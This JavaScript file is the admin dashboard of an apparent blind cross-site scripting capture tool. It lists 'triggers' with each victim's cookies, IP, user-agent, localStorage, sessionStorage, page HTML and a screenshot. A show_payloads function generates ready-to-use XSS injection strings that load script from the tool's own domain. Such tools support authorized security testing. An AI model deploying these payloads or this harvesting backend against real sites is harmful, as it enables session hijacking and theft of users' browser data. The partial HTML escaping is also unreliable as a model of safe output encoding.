function shitty_encode(s){
	return s ? s.replace(/</g,"&lt;").replace(/"/g,"&quot;") : "-";
}

var fields = {
	id: { name: 'ID' },
	time: { 
		name: 'Time (GMT)',
		special: function(trigger){
			var d = new Date(Date.parse(trigger.time));
			return d.toISOString().replace('T','<br>').split('.')[0];
		}
	},
	extra: { name: 'Extra' },
	url: { name: 'URL' },
	ip: { name: 'IP' },
	info: { 
		name: 'More info',
		special: function(trigger){
			var $btn = $('<button class="btn btn-sm btn-primary">View</button>').click(function(){
				$btn.html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>');
				$.get('/triggers/' + trigger.id, function(e){
					var html = '<h5>' + shitty_encode(e.url) + ' [' + shitty_encode(e.time) + ']</h5>' +
					'<div style="font-size: 11pt;text-align: left;padding: 0 15%;">' +
					'<h6>· Extra:</h6><p>' + shitty_encode(e.extra) + '</p>' +
					'<h6>· Cookies:</h6><p>' + shitty_encode(e.cookies) + '</p>' +
					'<h6>· IP:</h6><p>' + shitty_encode(e.ip) + '</p>' +
					'<h6>· User-Agent:</h6><p>' + shitty_encode(e.useragent) + '</p>' +
					'<h6>· localStorage:</h6><p>' + shitty_encode(e.localStorage) + '</p>' +
					'<h6>· sessionStorage:</h6><p>' + shitty_encode(e.sessionStorage) + '</p>' +
					'</div>' +
					'<div style="max-height:500px; overflow:auto"><a href="' + shitty_encode(e.canvas) + '" target="_blank"><img class="img-fluid" src="' + shitty_encode(e.canvas) + '"></a></div>' +
					'<textarea style="min-height:150px;font-size:11px" class="form-control" readonly>' + shitty_encode(e.html) + '</textarea>';
					Swal.fire({ width:'85%', html:html });
					$btn.html('View');
				});
			});
			return $btn;
		}
	},
	delete: {
		name: 'Delete',
		special: function(trigger){
			return $('<button class="btn btn-sm btn-danger">Delete</button>').click(function(){
				Swal.fire({
					title: 'Are you sure?',
					html: "Deleting element with ID: <b>" + trigger.id + "</b>",
					type: 'warning',
					showCancelButton: true,
					confirmButtonColor: '#3085d6',
					cancelButtonColor: '#d33',
					confirmButtonText: 'Yes, delete it!'
				}).then((result) => {
					if (result.value) {
						$.ajax({
							url: '/triggers/' + trigger.id,
							type: 'DELETE',
							success: function(result) {
								Swal.fire(
								'Deleted!',
								'Element has been deleted.',
								'success'
								).then((result) => {
									window.location.reload();
								});
							}
						});						
					}
				});
			});
		}
	}
};

$(function(){
	var $table = $('#triggers');
	
	$.get('/triggers', function(triggers){
		var $tbody = $('<tbody style="text-align:center"></tbody>');
		$.each(triggers, function(_, trigger){
			var $row = $('<tr></tr>');
			$.each(fields, function(key, field) {
				var $td = $('<td style="vertical-align:middle"></td>');
				if('special' in field) $td.html(field.special(trigger));
				else $td.text(trigger[key]);
				$row.append($td);
			});
			$tbody.append($row);
		});
		$('#loading-div').addClass('invisible');
		$table.append($tbody);
	});

	var $rowhead = $('<tr></tr>');
	$.each(fields, function(_, field) {
		$rowhead.append('<th>' + field.name + '</th>');
	});
	$table.prepend($('<thead style="text-align:center"></thead>').append($rowhead));
});

function show_payloads(){
	var domain = document.location.host;
	var payloads = [
		'"><script src="//' + domain + '"></script>',
		'"><script>$.getScript("//' + domain + '")</script>',
		'"><img/src=x onerror="import(\'//' + domain + '\')">',
		'"><base href="//' + domain + '"><script src="./"></script>'
	];
	var div = $('<div>');
	for (var i = 0; i < payloads.length; ++i) div.append($('<input class="form-control" readonly>').val(payloads[i])).append('<br>');
	Swal.fire({
		title: 'Payloads',
		html: div
	});
}
